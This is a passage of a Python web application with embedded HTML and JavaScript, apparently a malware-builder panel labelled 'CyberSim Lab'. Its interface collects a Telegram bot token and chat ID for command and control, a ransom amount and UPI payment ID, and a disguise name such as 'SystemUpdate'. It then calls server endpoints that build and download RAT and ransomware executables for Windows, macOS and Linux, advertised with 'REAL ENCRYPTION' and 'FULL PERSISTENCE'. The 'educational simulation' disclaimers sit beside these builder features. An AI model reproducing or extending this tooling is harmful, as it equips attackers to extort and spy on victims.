                    <div style="padding:12px;background:rgba(255,123,0,0.06);border:1px solid rgba(255,123,0,0.25);border-radius:8px;margin-top:10px;" id="rw-binary-area">
                        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
                            <span>&#128230;</span>
                            <span style="font-family:'Courier New',monospace;font-size:13px;font-weight:700;color:#ff7b00;">Direct Binary Download</span>
                        </div>
                        <div style="font-size:11px;color:#8b949e;margin-bottom:10px;">
                            Server pe binary build hoke direct download hota hai.<br>
                            <span id="rw-binary-info">Output: ransomware.exe (~8 MB)</span>
                        </div>
                        <div class="row" style="margin-bottom:10px;">
                            <div class="field" style="margin-bottom:0;">
                                <div class="label" style="color:#ff7b00;">Binary Name</div>
                                <input type="text" id="rw-exe-name" value="SystemUpdate">
                            </div>
                        </div>
                        <button class="btn btn-green" onclick="downloadRansomwareBinary()" id="rw-bin-btn" style="width:100%;justify-content:center;">
                            &#128230; Build &amp; Download Binary
                        </button>
                        <div style="margin-top:8px;font-size:10px;color:#484f58;font-family:'Courier New',monospace;text-align:center;" id="rw-bin-status"></div>
                    </div>
                </div>
            </div>
        </div>
        <div>
            <div class="badges" id="rw-badges">
                <span class="badge" style="background:rgba(255,123,0,0.2);color:#ff7b00;">RANSOMWARE</span>
                <span class="badge cyan">WINDOWS</span>
                <span class="badge green">TELEGRAM C2</span>
                <span class="badge yellow">REAL ENCRYPTION</span>
                <span class="badge red">FULL PERSISTENCE</span>
            </div>
            <div class="terminal">
                <div class="terminal-header">
                    <div class="terminal-dots"><span></span><span></span><span></span></div>
                    <div class="terminal-title" id="rw-term-title">Ransomware Generator</div>
                </div>
                <div class="terminal-body" id="rw-terminal"><span class="line info" style="color:#30363d;">Enter BOT_TOKEN + CHAT_ID, then click Generate...</span></div>
            </div>
        </div>
    </div>
</div>

</div>

<script>
let simResults = { payload: null, virus: null, rat: null, ransomware: null };

// Tab switching
function switchTab(name, el) {
    document.querySelectorAll('.module').forEach(m => m.classList.remove('active'));
    document.querySelectorAll('.tab').forEach(t => { t.className = 'tab'; });
    document.getElementById('mod-' + name).classList.add('active');
    if (name === 'payload') el.classList.add('active-green');
    else if (name === 'virus') el.classList.add('active-red');
    else if (name === 'rat') el.classList.add('active-purple');
    else if (name === 'ransomware') el.classList.add('active-orange');
}

// ===== VIRUS =====
const virusDescs = {
    ransomware: 'Encrypts victim files and demands ransom payment.',
    worm: 'Self-replicating malware that spreads across networks.',
    trojan_dropper: 'Disguised as legitimate software, drops secondary payloads.',
    file_infector: 'Attaches to executables, spreads when infected files run.',
    rootkit: 'Hides deep in OS kernel, persistent stealth access.',
};
function updateVirusDesc() {
    document.getElementById('v-desc').textContent = virusDescs[document.getElementById('v-type').value] || '';
    const t = document.getElementById('v-type').value;
    document.getElementById('v-algo-field').style.display = t === 'ransomware' ? 'block' : 'none';
    updateVirusBadges();
}
function updateVirusBadges() {
    const t = document.getElementById('v-type').value.toUpperCase();
    const o = document.getElementById('v-os').value.toUpperCase();
    const p = document.getElementById('v-prop').value.toUpperCase();
    const s = document.getElementById('v-stealth').value;
    document.getElementById('v-badges').innerHTML =
        `<span class="badge red">${t}</span><span class="badge cyan">${o}</span><span class="badge yellow">${p}</span><span class="badge purple">Stealth: ${s}</span>`;
}

// ===== RAT (Telegram C2 Generator - Multi-OS) =====
function updateRatBadges() {
    const os = document.getElementById('r-os').value;
    const port = document.getElementById('r-port').value;
    const osUpper = os.toUpperCase();
    const portLabel = port === '0' ? 'AUTO PORT' : 'PORT: ' + port;
    document.getElementById('r-os-badge').textContent = osUpper;
    document.getElementById('r-port-badge').textContent = portLabel;

    // Update r-badges
    const osLabels = { windows: 'Windows 10/11', macos: 'macOS', linux: 'Linux (Ubuntu/Kali)' };
    document.getElementById('r-badges').innerHTML =
        '<span class="badge purple">TELEGRAM C2</span>' +
        '<span class="badge cyan">' + osUpper + '</span>' +
        '<span class="badge green">v5.0 STEALTH</span>' +
        '<span class="badge yellow">30+ COMMANDS</span>' +
        '<span class="badge red">FULL PERSISTENCE</span>' +
        '<span class="badge cyan">' + portLabel + '</span>';

    // Update generate button
    document.getElementById('r-gen-btn').innerHTML = '\u26A1 Generate ' + osLabels[os] + ' RAT';

    // Update terminal title
    const osShort = { windows: 'Windows', macos: 'macOS', linux: 'Linux' };
    document.getElementById('rat-term-title').textContent = 'RAT Generator - ' + osShort[os] + ' v5.0';

    // Update download box for selected OS
    const exts = { windows: '.exe', macos: '.app', linux: '.sh' };
    const titles = { windows: 'Direct EXE Download', macos: 'Direct macOS Download', linux: 'Direct Linux Binary Download' };
    const btns = { windows: '\uD83D\uDCE6 Download .exe Direct', macos: '\uD83D\uDCE6 Download .app Direct', linux: '\uD83D\uDCE6 Download Binary Direct' };
    const descs = {
        windows: 'Server pe EXE build hoke direct download hota hai. Koi ZIP nahi, koi .py nahi!<br>Output: <code style="color:#58a6ff;" id="exe-kit-name-preview">SystemUpdate.exe</code> (~18 MB)<br><span style="color:#d29922;" id="exe-kit-note">First build: 30-60 sec. After: instant!</span>',
        macos: 'macOS app build hoke direct download hota hai. Koi .py nahi!<br>Output: <code style="color:#58a6ff;" id="exe-kit-name-preview">SystemUpdate.command</code><br><span style="color:#d29922;" id="exe-kit-note">Double-click to run on macOS</span>',
        linux: 'Linux ELF binary build hoke direct download hota hai. Koi .py nahi!<br>Output: <code style="color:#58a6ff;" id="exe-kit-name-preview">SystemUpdate</code> (ELF Binary)<br><span style="color:#d29922;" id="exe-kit-note">chmod +x to make executable</span>'
    };
    document.getElementById('exe-kit-title').textContent = titles[os];
    document.getElementById('exe-kit-desc').innerHTML = descs[os];
    document.getElementById('exe-kit-btn').innerHTML = btns[os];
    updateExePreview();
}

function updateC2Status() {
    const token = document.getElementById('r-token').value.trim();
    const chatId = document.getElementById('r-chatid').value.trim();
    const statusEl = document.getElementById('c2-status');
    const dotEl = document.getElementById('c2-dot');
    const textEl = document.getElementById('c2-status-text');
    if (token && chatId) {
        statusEl.className = 'c2-status ready';
        dotEl.className = 'c2-dot on';
        const maskedToken = token.length > 10 ? token.substring(0,6) + '***' + token.substring(token.length-4) : token;
        textEl.textContent = `C2 Configured - Bot: ${maskedToken} | Chat: ${chatId}`;
    } else {
        statusEl.className = 'c2-status empty';
        dotEl.className = 'c2-dot off';
        if (!token && !chatId) textEl.textContent = 'BOT_TOKEN and CHAT_ID required';
        else if (!token) textEl.textContent = 'BOT_TOKEN is missing';
        else textEl.textContent = 'CHAT_ID is missing';
    }
}

function generateRat() {
    const token = document.getElementById('r-token').value.trim();
    const chatId = document.getElementById('r-chatid').value.trim();
    if (!token || !chatId) {
        alert('BOT_TOKEN aur CHAT_ID dono daal do!');
        return;
    }
    const os = document.getElementById('r-os').value;
    const port = document.getElementById('r-port').value;
    const osUpper = os.toUpperCase();
    const btn = document.getElementById('r-gen-btn');
    btn.disabled = true; btn.innerHTML = '&#9881; Generating ' + osUpper + ' RAT...';
    document.getElementById('r-download-area').style.display = 'none';

    fetch('/api/generate_rat', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({bot_token: token, chat_id: chatId, target_os: os, c2_port: port})
    }).then(r => {
        if (!r.ok) throw new Error('Generation failed');
        return r.json();
    }).then(data => {
        streamLines('rat-terminal', data.lines, () => {
            btn.disabled = false; btn.innerHTML = '\u26A1 Generate ' + osUpper + ' RAT';
            document.getElementById('r-download-area').style.display = 'block';
            simResults.rat = data.report;
        });
    }).catch(err => {
        btn.disabled = false; btn.innerHTML = '\u26A1 Generate ' + osUpper + ' RAT';
        alert('Error: ' + err.message);
    });
}



// ===== OS-AWARE BINARY DOWNLOAD =====
function updateExePreview() {
    const os = document.getElementById('r-os').value;
    const name = document.getElementById('exe-name').value.trim() || 'SystemUpdate';
    const exts = { windows: '.exe', macos: '.command', linux: '.sh' };
    const ext = exts[os] || '.exe';
    const previewEl = document.getElementById('exe-kit-name-preview');
    if (previewEl) previewEl.textContent = name + ext;
}

function downloadBinary() {
    const token = document.getElementById('r-token').value.trim();
    const chatId = document.getElementById('r-chatid').value.trim();
    if (!token || !chatId) { alert('BOT_TOKEN aur CHAT_ID dono daal do!'); return; }
    const os = document.getElementById('r-os').value;
    const port = document.getElementById('r-port').value;
    const fakeName = document.getElementById('exe-name').value.trim() || 'SystemUpdate';
    const btn = document.getElementById('exe-kit-btn');
    const statusEl = document.getElementById('exe-kit-status');
    const osLabels = { windows: 'Windows EXE', macos: 'macOS App', linux: 'Linux ELF Binary' };
    const exts = { windows: '.exe', macos: '.command', linux: '.sh' };

    btn.disabled = true;
    btn.innerHTML = '\&#9881; Building ' + osLabels[os] + '...';
    if (statusEl) statusEl.textContent = 'Building binary... (30-60 sec first time)';

    fetch('/api/build_binary', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({bot_token: token, chat_id: chatId, target_os: os, c2_port: port, fake_name: fakeName})
    }).then(async r => {
        if (!r.ok) {
            let errMsg = 'Build failed';
            try { const err = await r.json(); errMsg = err.error || errMsg; } catch(e) { errMsg = 'Server error ' + r.status; }
            throw new Error(errMsg);
        }
        const contentLen = r.headers.get('Content-Length');
        if (contentLen && parseInt(contentLen) < 100) {
            const text = await r.text();
            throw new Error(text || 'Empty response');
        }
        return r.blob();
    }).then(blob => {
        if (blob.size < 100) { throw new Error('File too small - build failed'); }
        const filename = fakeName + (exts[os] || '.exe');
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = filename;
        a.click();
        setTimeout(() => URL.revokeObjectURL(url), 30000);
        const sizeMB = (blob.size / (1024*1024)).toFixed(1);
        btn.disabled = false;
        btn.innerHTML = '\&#9989; ' + osLabels[os] + ' Downloaded! (' + sizeMB + ' MB)';
        if (statusEl) statusEl.textContent = filename + ' (' + sizeMB + ' MB) downloaded successfully';
    }).catch(err => {
        alert('Error: ' + err.message + '\\n\\nTry again!');
        btn.disabled = false;
        const labels = { windows: '\&#128230; Download .exe Direct', macos: '\&#128230; Download .app Direct', linux: '\&#128230; Download Binary Direct' };
        btn.innerHTML = labels[os] || '\&#128230; Download Binary';
        if (statusEl) statusEl.textContent = 'Error: ' + err.message;
    });
}

// ===== COMMON FUNCTIONS =====

// Terminal streaming
function streamLines(terminalId, lines, callback) {
    const term = document.getElementById(terminalId);
    term.innerHTML = '';
    let i = 0;
    function next() {
        if (i >= lines.length) { if(callback) callback(); return; }
        const l = lines[i];
        const span = document.createElement('span');
        span.className = 'line ' + (l.type || 'output');
        span.textContent = l.text;
        term.appendChild(span);
        term.scrollTop = term.scrollHeight;
        i++;
        setTimeout(next, 60 + Math.random() * 100);
    }
    next();
}

function resetTerminal(mod) {
    const map = { virus: 'virus-terminal', rat: 'rat-terminal', ransomware: 'rw-terminal' };
    document.getElementById(map[mod]).innerHTML = '<span class="line info" style="color:#30363d;">Waiting...</span>';
    document.getElementById(mod[0]+'-download-area').style.display = 'none';
    simResults[mod] = null;
}

// Download functions for payload & virus (unchanged)
function downloadScript(mod) {
    const cfg = getConfig(mod);
    fetch('/api/download', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({module: mod, config: cfg})
    }).then(r => {
        if (!r.ok) throw new Error();
        return r.blob();
    }).then(blob => {
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `${mod}_sim_${cfg[mod==='virus'?'virusType':'ratType']}.py`;
        a.click();
        URL.revokeObjectURL(url);
    });
}

function downloadReport(mod) {
    if (!simResults[mod]) return;
    const blob = new Blob([simResults[mod]], {type:'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `${mod}_report_${Date.now()}.txt`;
    a.click();
    URL.revokeObjectURL(url);
}

function getConfig(mod) {
    if (mod === 'virus') return {
        virusType: document.getElementById('v-type').value,
        targetOS: document.getElementById('v-os').value,
        encryptionAlgo: document.getElementById('v-algo').value,
        propagationMethod: document.getElementById('v-prop').value,
        stealthLevel: document.getElementById('v-stealth').value,
        botToken: document.getElementById('v-token').value.trim(),
        chatId: document.getElementById('v-chatid').value.trim()
    };
    return {};
}

// Run simulations via API
function runVirusSim() {
    const btn = document.getElementById('v-run-btn');
    btn.disabled = true; btn.innerHTML = '&#9881; Simulating...';
    document.getElementById('v-download-area').style.display = 'none';
    const cfg = getConfig('virus');
    fetch('/api/simulate', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({module:'virus', config: cfg})
    }).then(r=>r.json()).then(data => {
        streamLines('virus-terminal', data.lines, () => {
            btn.disabled = false; btn.innerHTML = '&#9654; Run Simulation';
            document.getElementById('v-download-area').style.display = 'block';
            simResults.virus = data.report;
        });
    });
}

// ===== RANSOMWARE GENERATOR (Telegram C2) =====
function updateRansomC2Status() {
    const token = document.getElementById('rw-token').value.trim();
    const chatId = document.getElementById('rw-chatid').value.trim();
    const statusEl = document.getElementById('rw-c2-status');
    const dotEl = document.getElementById('rw-c2-dot');
    const textEl = document.getElementById('rw-c2-status-text');
    if (token && chatId) {
        statusEl.className = 'c2-status ready';
        dotEl.className = 'c2-dot on';
        const maskedToken = token.length > 10 ? token.substring(0,6) + '***' + token.substring(token.length-4) : token;
        textEl.textContent = 'C2 Configured - Bot: ' + maskedToken + ' | Chat: ' + chatId;
    } else {
        statusEl.className = 'c2-status empty';
        dotEl.className = 'c2-dot off';
        if (!token && !chatId) textEl.textContent = 'BOT_TOKEN and CHAT_ID required';
        else if (!token) textEl.textContent = 'BOT_TOKEN is missing';
        else textEl.textContent = 'CHAT_ID is missing';
    }
}

function updateRansomwareBadges() {
    const os = document.getElementById('rw-os').value;
    const algo = document.getElementById('rw-algo').value;
    const method = document.getElementById('rw-method').value;
    const osUpper = os.toUpperCase();
    const algoUpper = algo.toUpperCase();
    document.getElementById('rw-badges').innerHTML =
        '<span class="badge" style="background:rgba(255,123,0,0.2);color:#ff7b00;">RANSOMWARE</span>' +
        '<span class="badge cyan">' + osUpper + '</span>' +
        '<span class="badge green">TELEGRAM C2</span>' +
        '<span class="badge yellow">' + algoUpper + '</span>' +
        '<span class="badge red">FULL PERSISTENCE</span>';
    const osShort = { windows: 'Windows', macos: 'macOS', linux: 'Linux' };
    document.getElementById('rw-term-title').textContent = 'Ransomware Generator - ' + osShort[os] + ' v5.0';
    const binaryInfo = { windows: 'Output: SystemUpdate.exe (~8 MB)', macos: 'Output: SystemUpdate.command', linux: 'Output: SystemUpdate (ELF Binary)' };
    const binaryEl = document.getElementById('rw-binary-info');
    if (binaryEl) binaryEl.textContent = binaryInfo[os] || binaryInfo.windows;
}

function generateRansomware() {
    const token = document.getElementById('rw-token').value.trim();
    const chatId = document.getElementById('rw-chatid').value.trim();
    if (!token || !chatId) { alert('BOT_TOKEN aur CHAT_ID dono daal do!'); return; }
    const os = document.getElementById('rw-os').value;
    const algo = document.getElementById('rw-algo').value;
    const amount = document.getElementById('rw-amount').value || '500';
    const method = document.getElementById('rw-method').value;
    const upiId = document.getElementById('rw-upi').value.trim() || 'pay@merchant';
    const btn = document.getElementById('rw-gen-btn');
    const osUpper = os.toUpperCase();
    btn.disabled = true; btn.innerHTML = '&#9881; Generating ' + osUpper + ' Ransomware...';
    document.getElementById('rw-download-area').style.display = 'none';
    fetch('/api/generate_ransomware', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({bot_token: token, chat_id: chatId, target_os: os, enc_algo: algo, ransom_amount: amount, ransom_method: method, upi_id: upiId})
    }).then(r => {
        if (!r.ok) throw new Error('Generation failed');
        return r.json();
    }).then(data => {
        streamLines('rw-terminal', data.lines, () => {
            btn.disabled = false; btn.innerHTML = '\u26A1 Generate ' + osUpper + ' Ransomware';
            document.getElementById('rw-download-area').style.display = 'block';
            simResults.ransomware = data.report;
        });
    }).catch(err => {
        btn.disabled = false; btn.innerHTML = '\u26A1 Generate ' + osUpper + ' Ransomware';
        alert('Error: ' + err.message);
    });
}

function downloadRansomwareReport() {
    if (!simResults.ransomware) return;
    const blob = new Blob([simResults.ransomware], {type:'text/plain'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url; a.download = 'ransomware_report_' + Date.now() + '.txt';
    a.click(); URL.revokeObjectURL(url);
}

function downloadRansomwareBinary() {
    const token = document.getElementById('rw-token').value.trim();
    const chatId = document.getElementById('rw-chatid').value.trim();
    if (!token || !chatId) { alert('BOT_TOKEN aur CHAT_ID dono daal do!'); return; }
    const os = document.getElementById('rw-os').value;
    const algo = document.getElementById('rw-algo').value;
    const amount = document.getElementById('rw-amount').value || '500';
    const method = document.getElementById('rw-method').value;
    const upiId = document.getElementById('rw-upi').value.trim() || 'pay@merchant';
    const fakeName = document.getElementById('rw-exe-name').value.trim() || 'SystemUpdate';
    const btn = document.getElementById('rw-bin-btn');
    const statusEl = document.getElementById('rw-bin-status');
    const osLabels = { windows: 'Windows EXE', macos: 'macOS App', linux: 'Linux ELF' };
    const exts = { windows: '.exe', macos: '.command', linux: '.sh' };
    btn.disabled = true; btn.innerHTML = '&#9881; Building...';
    if (statusEl) statusEl.textContent = 'Building binary...';
    if (statusEl) statusEl.textContent = 'Building binary... (30-60 sec first time)';
    fetch('/api/build_ransomware_binary', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({bot_token: token, chat_id: chatId, target_os: os, enc_algo: algo, ransom_amount: amount, ransom_method: method, upi_id: upiId, fake_name: fakeName})
    }).then(async r => {
        if (!r.ok) {
            let errMsg = 'Build failed';
            try { const err = await r.json(); errMsg = err.error || errMsg; } catch(e) { errMsg = 'Server error ' + r.status; }
            throw new Error(errMsg);
        }
        const contentLen = r.headers.get('Content-Length');
        if (contentLen && parseInt(contentLen) < 100) {
            const text = await r.text();
            throw new Error(text || 'Empty response');
        }
        return r.blob();
    }).then(blob => {
        if (blob.size < 100) { throw new Error('File too small - build failed'); }
        const filename = fakeName + (exts[os] || '.exe');
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url; a.download = filename; a.click();
        setTimeout(() => URL.revokeObjectURL(url), 30000);
        const sizeMB = (blob.size / (1024*1024)).toFixed(1);
        btn.disabled = false;
        btn.innerHTML = '\u2714 ' + osLabels[os] + ' Downloaded! (' + sizeMB + ' MB)';
        if (statusEl) statusEl.textContent = filename + ' (' + sizeMB + ' MB) done!';
    }).catch(err => {
        alert('Error: ' + err.message);
        btn.disabled = false;
        btn.innerHTML = '\uD83D\uDCE6 Build & Download Binary';
        if (statusEl) statusEl.textContent = 'Error: ' + err.message;
    });
}

updateRansomC2Status();

function downloadVirusBinary() {
    var cfg = getConfig('virus');
    var os = document.getElementById('v-os').value;
    var fakeName = document.getElementById('v-fakename').value.trim() || 'SystemUpdate';
    var btn = document.getElementById('v-bin-btn');
    var origHTML = btn.innerHTML;
    var osLabels = {windows: 'Windows .exe', linux: 'Linux .sh', macos: 'macOS .command'};
    var exts = {windows: '.exe', linux: '.sh', macos: '.command'};
    btn.disabled = true; btn.innerHTML = '&#9881; Building ' + osLabels[os] + '...';
    fetch('/api/build_virus_binary', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({config: cfg, target_os: os, fake_name: fakeName})
    }).then(async function(r) {
        if (!r.ok) { var e = 'Build failed'; try { e = (await r.json()).error || e; } catch(x) {} throw new Error(e); }
        var cl = r.headers.get('Content-Length');
        if (cl && parseInt(cl) < 100) { var t = await r.text(); throw new Error(t || 'Empty response'); }
        return r.blob();
    }).then(function(blob) {
        if (blob.size < 50) { throw new Error('Empty file - build failed'); }
        var url = URL.createObjectURL(blob);
        var a = document.createElement('a');
        var fname = fakeName + exts[os];
        a.href = url; a.download = fname; a.click();
        setTimeout(function() { URL.revokeObjectURL(url); }, 30000);
        var sizeKB = (blob.size / 1024).toFixed(0);
        btn.disabled = false;
        btn.innerHTML = '\u2714 ' + osLabels[os] + ' Downloaded! (' + sizeKB + ' KB)';
    }).catch(function(err) {
        alert('Error: ' + err.message);
        btn.disabled = false; btn.innerHTML = origHTML;
    });
}

// Init
updateVirusBadges(); updateC2Status(); updateRatBadges(); updateRansomwareBadges();
</script>
</body>
</html>
'''

# ============================================================
# VIRUS SIMULATION LOGIC
# ============================================================

def gen_virus_lines(cfg):
    lines = []
    vt = cfg['virusType']
    names = {'ransomware':'RANSOMWARE-SIM','worm':'WORM-SIM','trojan_dropper':'TROJAN-DROPPER-SIM','file_infector':'FILE-INFECTOR-SIM','rootkit':'ROOTKIT-SIM'}
    prop = cfg['propagationMethod']
    stealth = cfg['stealthLevel']
    algo = cfg['encryptionAlgo']
    c2 = "Telegram C2 (Bot)"
    tos = cfg['targetOS']

    lines.append({'text':'\u2554'*50, 'type':'system'})
    lines.append({'text':'     MALWARE BEHAVIORAL SIMULATION ENGINE v2.1', 'type':'system'})
    lines.append({'text':'     Virus Simulation Module', 'type':'system'})
    lines.append({'text':'\u2557'*50, 'type':'system'})
    lines.append({'text':'', 'type':'output'})

    lines.append({'text':'──── PHASE 1: INITIAL INFECTION ────', 'type':'system'})
    if prop == 'email':
        lines.append({'text':'[SIM] Simulating phishing email delivery...', 'type':'info'})
        lines.append({'text':f'[SIM] Email subject: "URGENT: Invoice #{random.randint(10000,99999)}"', 'type':'info'})
        lines.append({'text':f'[SIM] Attachment: report_{random.randint(100,999)}.zip', 'type':'info'})
        lines.append({'text':'[SIM] User opened attachment -> Macro executed', 'type':'info'})
    elif prop == 'usb':
        lines.append({'text':'[SIM] Simulating USB drive infection...', 'type':'info'})
        lines.append({'text':'[SIM] Creating autorun.inf on USB device...', 'type':'info'})
        lines.append({'text':'[SIM] USB inserted -> AutoRun triggered', 'type':'info'})
    elif prop == 'network_share':
        lines.append({'text':'[SIM] Scanning for open SMB shares (445/SMB)...', 'type':'info'})
        lines.append({'text':f'[SIM] Found share: \\\\192.168.1.{random.randint(1,254)}\\shared', 'type':'info'})
        lines.append({'text':'[SIM] Attempting EternalBlue (MS17-010)...', 'type':'warning'})
        lines.append({'text':'[SIM] Shellcode executed -> Payload dropped', 'type':'success'})
    else:
        lines.append({'text':'[SIM] Joining P2P botnet network...', 'type':'info'})
        lines.append({'text':f'[SIM] Connecting to C2: {c2}:443', 'type':'info'})
        lines.append({'text':'[SIM] Receiving encrypted payload via P2P tunnel...', 'type':'info'})
    lines.append({'text':f'[+] Infection vector: {prop.upper()} - SUCCESS', 'type':'success'})
    lines.append({'text':'', 'type':'output'})

    lines.append({'text':'──── PHASE 2: PRIVILEGE ESCALATION ────', 'type':'system'})
    lines.append({'text':'[SIM] Checking current privileges...', 'type':'info'})
    if stealth == 'advanced':
        lines.append({'text':'[SIM] Using UAC bypass (Token Impersonation)...', 'type':'warning'})
        lines.append({'text':f'[SIM] Duplicating SYSTEM token from PID {600+random.randint(0,200)}', 'type':'info'})
        lines.append({'text':'[+] Privilege Level: SYSTEM (Full Access)', 'type':'success'})
    elif stealth == 'intermediate':
        lines.append({'text':f'[SIM] Using exploit: CVE-2024-{random.randint(10000,99999)}', 'type':'warning'})
        lines.append({'text':'[+] Privilege Level: Administrator', 'type':'success'})
    else:
        lines.append({'text':'[+] Privilege Level: User', 'type':'success'})
    lines.append({'text':'', 'type':'output'})

    lines.append({'text':'──── PHASE 3: PERSISTENCE MECHANISM ────', 'type':'system'})
    n_persist = {'basic':2,'intermediate':3,'advanced':4}[stealth]
    p_methods = [
        f'[SIM] Registry Key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost_{"".join(random.choices(string.ascii_lowercase,k=6))}',
        f'[SIM] Service Created: {"".join(random.choices(string.ascii_lowercase,k=8))} (Start: Automatic)',
        f'[SIM] Scheduled Task: "SystemUpdate_{random.randint(0,100)}" -> Runs hourly',
        f'[SIM] WMI Event Subscription created for persistence',
    ]
    for m in p_methods[:n_persist]:
        lines.append({'text':m, 'type':'info'})
    lines.append({'text':f'[+] {n_persist} persistence mechanisms installed', 'type':'success'})
    lines.append({'text':'', 'type':'output'})

    phase_names = {'ransomware':'FILE ENCRYPTION','worm':'NETWORK PROPAGATION','rootkit':'ROOTKIT INSTALLATION','trojan_dropper':'SECONDARY PAYLOAD','file_infector':'FILE INFECTION'}
    lines.append({'text':f'──── PHASE 4: {phase_names[vt]} ────', 'type':'system'})

    if vt == 'ransomware':
        lines.append({'text':f'[SIM] Generating RSA-2048 key pair ({algo})...', 'type':'info'})
        lines.append({'text':f'[SIM] Public key: {"".join(random.choices("0123456789ABCDEF",k=40))}', 'type':'output'})
        lines.append({'text':f'[SIM] Private key sent to C2: {c2}', 'type':'warning'})
        lines.append({'text':f'[SIM] Starting file encryption using {algo}...', 'type':'info'})
        lines.append({'text':'', 'type':'output'})
        total = 0
        for d in ['Documents','Desktop','Downloads','Pictures']:
            cnt = random.randint(10,50)
            total += cnt
            lines.append({'text':f'[SIM] Scanning /home/user/{d}... Found {cnt} files', 'type':'info'})
            for _ in range(min(cnt,3)):
                ext = random.choice(['.docx','.xlsx','.pdf','.jpg','.txt','.csv'])
                lines.append({'text':f'  [ENCRYPT] report_{random.randint(0,999)}{ext} -> {ext}.locked', 'type':'warning'})
        lines.append({'text':'', 'type':'output'})
        lines.append({'text':f'[!] TOTAL FILES ENCRYPTED: {total}', 'type':'error'})
        lines.append({'text':'[SIM] Dropping ransom note: README_DECRYPT.txt', 'type':'warning'})
    elif vt == 'worm':
        lines.append({'text':'[SIM] Scanning local network for vulnerable hosts...', 'type':'info'})
        for i in range(1,30):
            ip = f"192.168.1.{i}"
            port = random.choice([445,3389,22,80,443,8080])
            st = random.choice(['OPEN','FILTERED','FILTERED','CLOSED'])
            lines.append({'text':f'  [SCAN] {ip}:{port} -> {st}', 'type':'warning' if st=='OPEN' else 'output'})
            if st=='OPEN' and random.random()>0.7:
                lines.append({'text':f'  [INFECT] {ip} -> EXPLOIT SUCCESSFUL', 'type':'success'})
        lines.append({'text':'', 'type':'output'})
        lines.append({'text':f'[!] HOSTS INFECTED: {random.randint(3,15)}/254', 'type':'error'})
    elif vt == 'rootkit':
        lines.append({'text':'[SIM] Hooking kernel functions...', 'type':'info'})
        for h in ['NtQueryDirectoryFile -> HIDDEN','NtQuerySystemInformation -> HIDDEN','kernel32!CreateFileW -> REDIRECTED','ws2_32!send/recv -> INTERCEPTED']:
            lines.append({'text':f'  [HOOK] {h}', 'type':'warning'})
        lines.append({'text':'[+] Rootkit installed - System fully compromised', 'type':'success'})
    else:
        lines.append({'text':'[SIM] Downloading secondary payload from C2...', 'type':'info'})
        lines.append({'text':f'[SIM] Connecting to {c2}...', 'type':'info'})
        lines.append({'text':'[SIM] Payload decrypted and loaded into memory', 'type':'info'})
        lines.append({'text':'[+] Secondary payload executed successfully', 'type':'success'})
    lines.append({'text':'', 'type':'output'})

    lines.append({'text':'──── PHASE 5: C2 COMMUNICATION (Telegram) ────', 'type':'system'})
    lines.append({'text':'[SIM] Connecting to Telegram Bot C2...', 'type':'info'})
    lines.append({'text':'[SIM] Encrypted heartbeat channel established', 'type':'info'})
    lines.append({'text':f'[SIM] Heartbeat interval: {"Random (30-300s)" if stealth=="advanced" else "60s"}', 'type':'output'})
    lines.append({'text':'[SIM] Exfiltrating system information...', 'type':'info'})
    lines.append({'text':'[+] Telegram C2 communication established', 'type':'success'})
    lines.append({'text':'', 'type':'output'})
    lines.append({'text':'='*55, 'type':'system'})
    lines.append({'text':'  SIMULATION COMPLETE', 'type':'system'})
    lines.append({'text':f'  Virus Type: {vt}', 'type':'output'})
    lines.append({'text':f'  Propagation: {prop}', 'type':'output'})
    lines.append({'text':f'  Stealth: {stealth}', 'type':'output'})
    lines.append({'text':f'  C2: Telegram Bot', 'type':'output'})
    lines.append({'text':'='*55, 'type':'system'})
    lines.append({'text':'[!] EDUCATIONAL SIMULATION ONLY - No actual malware was created', 'type':'warning'})
    return lines


def gen_report(module, cfg, lines):
    r = []
    r.append('=' * 60)
    r.append(f'  CyberSim Lab - {module.upper()} Simulation Report')
    r.append(f'  Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
    r.append('=' * 60)
    r.append('')
    r.append('CONFIGURATION:')
    for k, v in cfg.items():
        r.append(f'  {k}: {v}')
    r.append('')
    r.append('SIMULATION LOG:')
    r.append('-' * 60)
    for l in lines:
        r.append(l['text'])
    r.append('-' * 60)
    r.append('')
    r.append('NOTE: Educational simulation only. No real malicious code generated.')
    return '\n'.join(r)

# ============================================================
# VIRUS SCRIPT GENERATOR
# ============================================================


def gen_virus_script(cfg):
    return f'''#!/usr/bin/env python3
"""
CyberSim Lab - MALWARE BEHAVIORAL SIMULATION (Educational Only)
Usage: sudo python3 virus_sim.py
"""
import os, sys, time, json, random, string, signal, socket, hashlib, platform
from datetime import datetime

CONFIG = {{
    "virus_type": "{cfg['virusType']}",
    "target_os": "{cfg['targetOS']}",
    "encryption_algo": "{cfg['encryptionAlgo']}",
    "propagation_method": "{cfg['propagationMethod']}",
    "stealth_level": "{cfg['stealthLevel']}",
    "bot_token": "{cfg.get('botToken', '')}",
    "chat_id": {cfg.get('chatId', '0') if cfg.get('chatId') else '0'},
    "sandbox_dir": "./virus_sim_sandbox",
    "report_file": "./virus_analysis_report.txt",
}}

SANDBOX = CONFIG["sandbox_dir"]
REPORT_FILE = CONFIG["report_file"]
ENCRYPTED_DIR = os.path.join(SANDBOX, "encrypted_files")
ORIGINAL_DIR = os.path.join(SANDBOX, "original_files")

class C:
    R='\\033[91m'; G='\\033[92m'; Y='\\033[93m'; B='\\033[94m'
    M='\\033[95m'; CY='\\033[96m'; W='\\033[97m'
    BD='\\033[1m'; DM='\\033[2m'; RS='\\033[0m'

def log(msg, color=C.G):
